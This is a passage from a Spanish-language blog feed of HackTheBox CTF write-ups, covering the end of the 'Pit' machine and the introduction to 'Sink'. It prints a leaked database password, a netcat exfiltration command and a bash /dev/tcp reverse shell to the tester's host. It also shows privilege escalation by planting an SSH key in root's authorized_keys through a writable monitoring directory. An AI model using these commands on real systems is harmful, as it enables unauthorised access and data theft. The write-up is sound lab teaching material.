   - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)
   - dbUser: username for database-access
   - dbPass: password for database-access
--&amp;gt;
&amp;lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&amp;gt;&amp;lt;/database&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como son del servidor de base de datos podemos probar a ver si encontramos alguna tabla con algo comprometedor o algo que podamos crackear‚Ä¶&lt;/p&gt;

&lt;p&gt;Como la Shell es una tristeza :P vamos a jugar con las herramientas &lt;a href=&quot;https://www.thegeekstuff.com/2008/08/get-quick-info-on-mysql-db-table-column-and-index-using-mysqlshow/&quot;&gt;mysqlshow&lt;/a&gt; para ver que bases de datos y tablas existen yyy con &lt;a href=&quot;https://www.linuxtotal.com.mx/index.php?cont=info_admon_021&quot;&gt;mysqldump&lt;/a&gt; para simular un ‚Äúbackup‚Äù de la info de esas tablas (o sea, nos muestra lo que contienen).&lt;/p&gt;

&lt;p&gt;(&lt;strong&gt;No encontramos nada √∫til, pero les dejo los comandos como aprendizaje&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Vemos las bases de datos actuales (&lt;code&gt;-pPASSWORD&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 fakeSheedDMS.py
nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos las tablas de X base de datos, existe una llamada &lt;strong&gt;seeddms&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nginx@pit:/casita$ mysqlshow -u seeddms -pied^ieY6xoquu seeddms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De todas las tablas existen 3 llamativas: &lt;code&gt;tblUserPasswordHistory&lt;/code&gt;, &lt;code&gt;tblUserPasswordRequest&lt;/code&gt; y &lt;code&gt;tblUsers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Con &lt;strong&gt;mysqlshow&lt;/strong&gt; podemos ver la estructura de cada tabla m√°s no su informaci√≥n, juguemos con &lt;strong&gt;mysqldump&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordHistory
nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUserPasswordRequest
nginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUsers
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La √∫nica que devuelve informaci√≥n es &lt;code&gt;tblUsers&lt;/code&gt;, encontramos la password en formato hash &lt;strong&gt;MD5&lt;/strong&gt;, pero al intentar crackearlas solo encontramos resultado con &lt;strong&gt;michelle&lt;/strong&gt; (que seria &lt;code&gt;michelle&lt;/code&gt; :P)&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Jugando con &lt;strong&gt;SSH&lt;/strong&gt; obtenemos este error siempre:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ssh michelle@10.10.10.241
michelle@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Intentando arreglarlo no lo logramos :(&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;expl_centos_login_done&quot;&gt;Ejecuci√≥n de comandos en servidor CentOS por medio de la interfaz web &lt;a href=&quot;#expl_centos_login_done&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Volviendo atr√°s record√© el login que ten√≠amos contra el servidor &lt;strong&gt;CentOS&lt;/strong&gt; con &lt;code&gt;cockpit&lt;/code&gt;, ¬ølo recuerdas? Pues probando esa contrase√±a con el usuario &lt;strong&gt;michelle&lt;/strong&gt; logramos acceder (:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_dashboard.png&quot; alt=&quot;346page9090_dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lissssssstones, enumerando un poquito la web encontramos esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_terminalLink.png&quot; alt=&quot;346page9090_terminalLink&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Damos clic y nos muestra esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090_terminal.png&quot; alt=&quot;346page9090_terminal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y s√≠, es una terminal, pero no vemos nada de lo que escribimos üôÉ interesante jajaj .__. Intentando comprobar si es funcional logramos cositas:&lt;/p&gt;

&lt;p&gt;Podemos decirle que nos env√≠e el resultado de un comando a alg√∫n puerto en el que estemos escuchando:&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha: &lt;code&gt;nc -lvp 4433&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Y ejecutamos (aunque no se vea) el comando &lt;code&gt;id&lt;/code&gt;, tomara el resultado y lo enviara al puerto &lt;strong&gt;4433&lt;/strong&gt; de nuestra m√°quina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;id | nc 10.10.14.146 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Damos enter y en nuestro listener recibimos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nc -lvp 4433
listening on [any] 4433 ...
connect to [10.10.14.146] from pit.htb [10.10.10.241] 34018
uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, estamos ejecutando comandos como &lt;strong&gt;michelle&lt;/strong&gt; (: comprobando el comando &lt;code&gt;hostname&lt;/code&gt; nos devuelve &lt;strong&gt;pit.htb&lt;/strong&gt; y jugando con &lt;code&gt;curL&lt;/code&gt; comprobamos que existe el binario, as√≠ que podemos destacar que claramente &lt;strong&gt;nginx&lt;/strong&gt; no ten√≠a permisos contra algunos binarios (por si alguien se lo preguntaba :P)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;obtenemos-reverse-shell-como-michelle&quot;&gt;&lt;u&gt;Obtenemos reverse shell como michelle&lt;/u&gt;&lt;/h3&gt;

&lt;p&gt;Nos volvemos a poner en escucha y en la web ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;bash -c 'bash &amp;gt;&amp;amp; /dev/tcp/10.10.14.146/4433 0&amp;gt;&amp;amp;1'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que generara una bash hacia nuestro puerto‚Ä¶ Dando enter obtenemos en nuestro listener:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_nc_michelleRevSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tenemos una Shell pero bastante fea eh! Lo bueno es que podemos intentar el transformarla en una &lt;strong&gt;Full TTY&lt;/strong&gt; o sea, que sea interactiva y que se vea bonita, hag√°moslo r√°pidamente:&lt;/p&gt;

&lt;p&gt;Escribimos &lt;code&gt;script /dev/null -c bash&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;script /dev/null -c bash
Script started, file is /dev/null
[michelle@pit ~]$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La pausamos ejecutando &lt;code&gt;CTRL+Z&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ ^Z
[1]+  Detenido                nc -lvp 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± stty raw -echo; fg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Escribimos &lt;code&gt;reset&lt;/code&gt; y ahora:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ export TERM=xterm
[michelle@pit ~]$ export SHELL=bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por √∫ltimo abrimos una nueva terminal y ejecutamos &lt;code&gt;stty -a&lt;/code&gt;, tomamos esos valores, volvemos a la Shell de &lt;strong&gt;michelle&lt;/strong&gt; y los escribimos en este comando (esos son mis valores):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ stty rows 43 columns 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y listo, tenemos una Shell completamente interactiva, es bonita, podemos movernos entre comandos, tenemos hist√≥rico y no nos debemos preocupar si ejecutamos &lt;code&gt;CTRL+C&lt;/code&gt;, ya que no la perderemos.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Estando dentro del sistema la enumeraci√≥n nos esta matando, no encontramos nada de nada‚Ä¶&lt;/p&gt;

&lt;p&gt;Hasta que record√© lo que hab√≠amos visto con &lt;strong&gt;snmpbulkwalk&lt;/strong&gt; al obtener los usuarios &lt;strong&gt;michelle&lt;/strong&gt; y &lt;strong&gt;root&lt;/strong&gt;, hab√≠a un proceso de monitoreo en ejecuci√≥n y hab√≠a una cadena que hac√≠a referencia a un binario:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;/usb/bin/monitor&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Busqu√©moslo a ver si tiene algo que ver:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ ls -la /usr/bin/monitor 
-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ file /usr/bin/monitor 
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Es un script, veamoslo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ cat /usr/bin/monitor 
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;WTF‚Ä¶ Un bucle que de la ruta &lt;code&gt;/usr/local/monitoring/&lt;/code&gt; toma los archivos que empiecen por &lt;code&gt;check&lt;/code&gt; y terminen en &lt;code&gt;sh&lt;/code&gt; yyy los ejecuta‚Ä¶ ¬øehhhh?&lt;/p&gt;

&lt;p&gt;S√≠ esta es la manera de escalar es muy sencillo, ya que simplemente deber√≠amos incluir un archivo en esa ruta con ese inicio, ese final y rogar√≠amos a la virgensita para que &lt;strong&gt;root&lt;/strong&gt; tenga alguna tarea cron o servicio ejecutando &lt;code&gt;/usr/bin/monitor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Veamos si tenemos &lt;a href=&quot;https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php#test&quot;&gt;permisos de escritura&lt;/a&gt; con un &lt;strong&gt;if&lt;/strong&gt; sobre la ruta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ if [ -w &quot;/usr/local/monitoring&quot; ]; then echo &quot;WRITABLE&quot;; else echo &quot;NOT WRITABLE&quot;; fi
WRITABLE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, al parecer si, para asegurarnos hacemos la f√°cil:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ echo &quot;holaaaaaaaaaaaaaaa&quot; &amp;gt; /usr/local/monitoring/hola.txt
[michelle@pit ~]$ ls -la /usr/local/monitoring/hola.txt
-rw-rw-r--. 1 michelle michelle 19 Jun 29 25:25 /usr/local/monitoring/hola.txt
[michelle@pit ~]$ cat /usr/local/monitoring/hola.txt
holaaaaaaaaaaaaaaa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, confirmado. Entonces intentemos generar el archivo que colocaremos en esa ruta y veamos si pasa algo.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privesc_scriptcheck&quot;&gt;Generamos script que ejecutar√° &lt;u&gt;/usr/bin/monitor&lt;/u&gt; &lt;a href=&quot;#privesc_scriptcheck&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para validar que el script nos funcione podemos indicarle que haga varias cositas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat checkea.sh
#!/bin/bash

id &amp;gt; /home/michelle/id.txt
id | nc 10.10.14.146 4435
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ser ejecutado crear√≠a un archivo en la ruta &lt;code&gt;/home/michelle/&lt;/code&gt; llamado &lt;code&gt;id.txt&lt;/code&gt; con el contenido del comando &lt;code&gt;id&lt;/code&gt; (que deber√≠a ser del usuario &lt;code&gt;root&lt;/code&gt;, o el que est√© ejecutando &lt;code&gt;/usr/bin/monitor&lt;/code&gt;) y enviar√≠a el mismo resultado, pero a un puerto por el que estaremos escuchando‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nc -lvp 4435
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Subimos el script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 -m http.server
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~]$ mkdir testeando
[michelle@pit ~]$ cd testeando/
[michelle@pit ~/testeando]$ curl http://10.10.14.146:8000/checkea.sh -o checkea.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora d√©mosle permisos de ejecuci√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~/testeando]$ chmod +x checkea.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y finalmente lo copiamos a la ruta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~/testeando]$ cp checkea.sh /usr/local/monitoring/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora deber√≠amos esperar a ver que pasa‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_gif_carwithabigtree.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y no pasa nada‚Ä¶ üòÄ (sonri√≥, pero no sonri√≥ en realidad)&lt;/p&gt;

&lt;p&gt;Despu√©s de muchas pruebas e intentos logramos ver algo distinto‚Ä¶&lt;/p&gt;

&lt;p&gt;Subimos el archivo, lo copiamos a la ruta y todo igual, pero mientras estaba el archivo ah√≠ se me dio por volver a probar el &lt;strong&gt;snmpbulkwalk&lt;/strong&gt; por curiosidad sobre el proceso de ‚Äúmonitoreo‚Äù y vaya vaya:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpbulkwalk -v2c -c public 10.10.10.241 iso
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso_foundScript.png&quot; alt=&quot;346bash_snmpWalkbulk_ex_iso_foundScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al menos sabemos que se esta intentando ejecutar el script, pero nos da &lt;strong&gt;Permission Denied&lt;/strong&gt; contra el binario &lt;code&gt;netcat&lt;/code&gt; y en la creaci√≥n del archivo &lt;code&gt;id.txt&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;De nuevo despu√©s de varias pruebas nos damos cuenta de que &lt;code&gt;/usr/bin/monitor&lt;/code&gt; es ejecutado una vez jugamos con &lt;strong&gt;snmp&lt;/strong&gt;‚Ä¶ Yyyy al final, algo nos dio resultado:&lt;/p&gt;

&lt;p&gt;Podemos probar en guardar nuestra llave p√∫blica &lt;strong&gt;SSH&lt;/strong&gt; en el archivo &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;, esto le indicar√° al sistema que a todas las llaves (identificaciones) dentro de ese archivo les permita acceso, pero para obtener ese acceso debemos hacer uso de la llave privada (que ser√≠a el remplazo de una contrase√±a (ya que no la tenemos :P)) asociada a esa llave p√∫blica. Entonces si hacen match la llave p√∫blica guardada en &lt;code&gt;authorized_keys&lt;/code&gt; con la llave privada indicada al intentarnos conectar por &lt;strong&gt;SSH&lt;/strong&gt;, nos deber√≠a devolver una &lt;strong&gt;Shell&lt;/strong&gt; como &lt;strong&gt;root&lt;/strong&gt; (porque estamos guardando nuestra ‚Äúcredencial‚Äù en el archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario &lt;strong&gt;root&lt;/strong&gt;), d√©mosle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.cyberciti.biz/faq/how-to-set-up-ssh-keys-on-linux-unix/&quot;&gt;How To Set up SSH Keys on a Linux / Unix System&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Primero generamos nuestras llaves (si no las tenemos):&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(De la forma sencilla)&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ssh-keygen -t rsa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente deber√≠amos tener estos archivos en la carpeta &lt;code&gt;~/.ssh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ls
id_rsa  id_rsa.pub
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;id_rsa&lt;/code&gt; es nuestra llave privada (no compartir con nadie).&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;id_rsa.pub&lt;/code&gt; es nuestra llave p√∫blica, esta es la que se usa para poder autenticarnos contra otros sistemas sin necesidad de proveer contrase√±as.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Listos, tomamos el contenido de la llave p√∫blica, lo pegamos en el script y le indicamos que tome tooooooooda la llave como una cadena de texto y la agregue en el archivo &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_script_idRSApub.png&quot; alt=&quot;346bash_script_idRSApub&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora, subimos el script, lo copiamos a la ruta y ejecutamos &lt;strong&gt;snmpbulkwalk&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[michelle@pit ~/testeando]$ curl http://10.10.14.146:8000/checkea.sh -o checkea.sh
[michelle@pit ~/testeando]$ chmod +x checkea.sh
[michelle@pit ~/testeando]$ cp checkea.sh /usr/local/monitoring/
[michelle@pit ~/testeando]$ ls -la /usr/local/monitoring/checkea.sh
-rwxrwxr-x. 1 michelle michelle 612 Jun 29 25:25 /usr/local/monitoring/checkea.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± snmpbulkwalk -v2c -c public 10.10.10.241 iso
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No vemos ning√∫n problema (al parecer):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso_scriptDone.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Intentamos ahora conectarnos por &lt;strong&gt;SSH&lt;/strong&gt; pas√°ndole nuestra llave privada como identificaci√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± ssh root@10.10.10.241 -i ~/.ssh/id_rsa
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yyyyyyyyyyyyyyyyy‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_monitor_ssh_rootDone.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;TAMOOOOOOOOOOOOOOOOOOOOOOS DENTROOOOOOOOO DE LA M√ÅQUINAAAAAAAAAAAAA COMOOOO &lt;strong&gt;ROOOOOOT&lt;/strong&gt;!!&lt;/p&gt;

&lt;p&gt;Veamos las flags‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346flags.png&quot; alt=&quot;346flags&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FIN!! NO VA M√ÅS!!&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Dios, fue una m√°quina bastante, ihss, no s√©, muy poco amigable jjaajaj, pero bueno, se aprendi√≥, se hizo un lindo &lt;strong&gt;script&lt;/strong&gt; y pensamos mucho lateralmente.&lt;/p&gt;

&lt;p&gt;La parte del script (privesc) fue algo extra√±a. Lo que me gusto es que todo lo que encontramos se us√≥, as√≠ que bien ah√≠!!&lt;/p&gt;

&lt;p&gt;Y bueno, nos leeremos en otros rincones de tu mente, descansa (de verdad) pero recuerda, a seguir ROMPIENDO todoooooooooooo!&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Sep 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/pit</link>
        <guid isPermaLink="true">http://localhost:4000/htb/pit</guid>
        
        <category>CentOS</category>
        
        <category>DMS</category>
        
        <category>SeedDMS</category>
        
        <category>SNMP</category>
        
        <category>cockpit</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Sink</title>
        <description>&lt;p&gt;M√°quina &lt;strong&gt;Linux&lt;/strong&gt; nivel desquiciado. Nos enfrentaremos a un &lt;code&gt;HTTP Request Smuggling&lt;/code&gt; (loco loco), saltaremos entre usuarios a√∫n m√°s locos, veremos &lt;strong&gt;commits&lt;/strong&gt; relacionados a pasos a producci√≥n y pruebas extra√±as con üîëüîë, jugaremos bastante con &lt;code&gt;AWS CLI&lt;/code&gt;, encontraremos secretos :O y finalmente desencriptaremos un archivo tambi√©n jugando con &lt;code&gt;AWS&lt;/code&gt; y &lt;code&gt;llaves KMS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313sinkHTB.png&quot; alt=&quot;313sinkHTB&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/13531&quot;&gt;MrR3boot&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Desquiceddd! Este writeup es largito (m√°s que nada por los bloques de c√≥digo), as√≠ que cafecito y a rompernos la cabeza‚Ä¶&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Muy linda m√°quina.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Nos encontraremos con dos servicios, uno corriendo &lt;code&gt;Gitea&lt;/code&gt; y otro &lt;code&gt;Gunicorn&lt;/code&gt;, en el camino nos veremos las caras con un &lt;code&gt;HTTP request smuggling&lt;/code&gt; el cual nos permitir√° interceptar la &lt;strong&gt;cookie&lt;/strong&gt; de sesi√≥n del usuario &lt;code&gt;admin@sink.htb&lt;/code&gt;. La usaremos para entrar en un panel y encontrar unas notas, cada una tiene una credencial, una de ellas nos permitir√° entrar al servicio &lt;code&gt;Gitea&lt;/code&gt; referenciado antes.&lt;/p&gt;

&lt;p&gt;Veremos unos repositorios, commits y dem√°s info. En uno de los commits el usuario &lt;code&gt;marcus&lt;/code&gt; estaba haciendo pruebas con su llave &lt;code&gt;SSH&lt;/code&gt; privada y nos dej√≥ el rastro. Usaremos esa llave para entrar en la m√°quina como √©l.&lt;/p&gt;

&lt;p&gt;Empezaremos a jugar con &lt;code&gt;AWS CLI&lt;/code&gt; para ver &lt;strong&gt;logs&lt;/strong&gt; y &lt;strong&gt;secretos&lt;/strong&gt;, en el jugueteo :o encontraremos otras credenciales guardadas como eso, secretos. Una de ellas pertenecen al usuario &lt;code&gt;david&lt;/code&gt; y nos permitir√°n generar una sesi√≥n como √©l tanto en &lt;code&gt;Gitea&lt;/code&gt; como en la m√°quina.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;David&lt;/strong&gt; en sus archivos tiene uno llamado &lt;code&gt;servers.enc&lt;/code&gt; y esta encriptado mediante &lt;code&gt;aws&lt;/code&gt;. Seguiremos jugando con &lt;code&gt;AWS-CLI&lt;/code&gt;, pero ahora con &lt;code&gt;kms&lt;/code&gt; para interactuar con &lt;code&gt;keyId&lt;/code&gt;&lt;strong&gt;s&lt;/strong&gt; y buscar la manera de desencriptar el archivo valid√°ndolo contra distintas llaves que iremos encontrando.&lt;/p&gt;

&lt;p&gt;Finalmente encontraremos una llave que nos devuelve una cadena en &lt;code&gt;base64&lt;/code&gt;, la tomamos y guardamos en un archivo, el tipo de archivo generado es un comprimido &lt;code&gt;gzip&lt;/code&gt;, usaremos &lt;code&gt;zcat&lt;/code&gt; para descubrir que contiene el archivo &lt;code&gt;servers.yml&lt;/code&gt;, veremos otras credenciales en este caso de un usuario llamado &lt;code&gt;admin&lt;/code&gt;. Nos servir√°n para generar una Shell como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Muuuuuuuuuy real, alguna que otra cosita conocida pero sobre todo demasiada enumeraci√≥n (mucha lectura y b√∫squeda).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun d√≠a se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Vuelve que el dolor me mata.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Usamos &lt;strong&gt;nmap&lt;/strong&gt; para descubrir los puertos que tiene abiertos la m√°quina&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-3000&quot;&gt;Recorremos el servicio web corriendo en el puerto 3000&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-3000&quot;&gt;Descubrimos que hay en el servicio web del puerto 5000&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#playing_with_vuln&quot;&gt;Encontramos cositas al interceptar las peticiones con &lt;strong&gt;BurpSuite&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
